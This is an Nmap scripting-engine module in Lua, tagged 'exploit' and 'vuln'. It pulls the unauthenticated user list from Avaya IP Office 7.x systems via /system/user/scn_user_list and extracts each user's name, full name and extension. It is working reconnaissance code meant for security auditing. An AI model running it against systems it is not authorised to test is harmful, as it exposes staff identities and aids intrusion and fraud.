description = [[
Attempts to enumerate users in Avaya IP Office systems 7.x.

Avaya IP Office systems allow unauthenticated access to the URI '/system/user/scn_user_list'
which returns a XML file containing user information such as display name, full name and
extension number.

* Tested on Avaya IP Office 7.0(27).
]]

---
-- @usage nmap -p80 --script http-avaya-ipoffice-users <target>
-- @usage nmap -sV --script http-avaya-ipoffice-users <target>
--
-- @output
-- PORT   STATE SERVICE REASON         VERSION
-- 80/tcp open  http    syn-ack ttl 99 Avaya IP Office VoIP PBX httpd 7.0(27)
-- | http-avaya-ipoffice-users:
-- |   title: Avaya IP Office User Listing
-- |   users:
-- |
-- |       full_name: John Doe
-- |       extension: 211
-- |       name: JDoe
-- |_  data_source: IPOFFICE/7.0(27) xxx.xxx.xxx.xxx

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}

local http = require "http"
local nmap = require "nmap"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"
local stdnse = require "stdnse"
local table = require "table"

portrule = shortport.http

action = function(host, port)
  -- Identify servers that answer 200 to invalid HTTP requests and exit as these would invalidate the tests
  local status_404, result_404, _ = http.identify_404(host,port)
  if ( status_404 and result_404 == 200 ) then
    stdnse.debug1("Exiting due to ambiguous response from web server on %s:%s. All URIs return status 200.", host.ip, port.number)
    return nil
  end
  local output = stdnse.output_table()
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local open_session = http.get(host.ip, port, "/system/user/scn_user_list")
  if open_session and open_session.status == 200 then
    local _, _, source = string.find(open_session.body, "<data_source>(.-)</data_source>")
    if source == nil then
      stdnse.debug(1, "Pattern not found. Exiting")
      return
    end
    output.title = "Avaya IP Office User Listing"
    output.users = {}
     output.data_source = source
    --match the string data_source and print it //Avaya IP Office 7.0(27)
    for user_block in string.gmatch(open_session.body, "<user>(.-)</user>") do
      stdnse.debug(1, "User block found!")
      local _, _, name = string.find(user_block, '<name>(.-)</name>')
      local _,_, fName = string.find(user_block, '<fname>(.-)</fname>')
      local _,_, ext = string.find(user_block, '<extn>(.-)</extn>')
      stdnse.debug1("User found!\nName: %s\nFull name: %s\nExt:%s", name, fName, ext)
      if name ~= nil or fName ~= nil or ext ~= nil then
        local user = {}
        user.name = name
        user.full_name = fName
        user.extension = ext
        table.insert(output.users, user)
      end
    end
    return output
  end
  return
end
